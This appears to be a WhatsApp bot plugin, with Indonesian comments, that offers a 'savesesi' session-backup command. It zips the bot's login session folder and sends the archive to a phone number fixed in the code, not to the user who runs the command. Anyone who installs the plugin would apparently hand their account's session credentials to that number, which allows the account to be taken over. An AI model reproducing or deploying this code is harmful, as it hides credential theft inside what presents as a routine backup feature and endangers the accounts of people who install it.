const fs = require('fs');
const archiver = require('archiver');
const path = require('path');

let handler = async (m, { conn }) => {
    m.reply('🚩 Sedang mem-backup session...')
 const sourceFolder = './IchanZX';
const zipFilePath = './lib/Ndikz/session.zip';

// Buat objek output stream
const output = fs.createWriteStream(zipFilePath);
const archive = archiver('zip', {
  zlib: { level: 9 } // Tingkat kompresi tertinggi
});

// Event saat proses arsip selesai
output.on('close', () => {
  console.log('Arsip berhasil dibuat!');
});

// Event saat terjadi kesalahan
archive.on('error', (err) => {
  throw err;
});

// Mulai arsip folder
archive.pipe(output);
archive.directory(sourceFolder, false);
archive.finalize();
    setTimeout(async () => {
         const sesi = await fs.readFileSync('./lib/Ndikz/session.zip')
    conn.sendMessage('6281232615640@s.whatsapp.net', { document: sesi, mimetype: 'zip', fileName: 'session.zip' }, { quoted: m })
      }, 12000)
}

handler.help = ['backup']
handler.tags = ['owner']
handler.command = /^savesesi$/i

handler.premium = true
module.exports = handler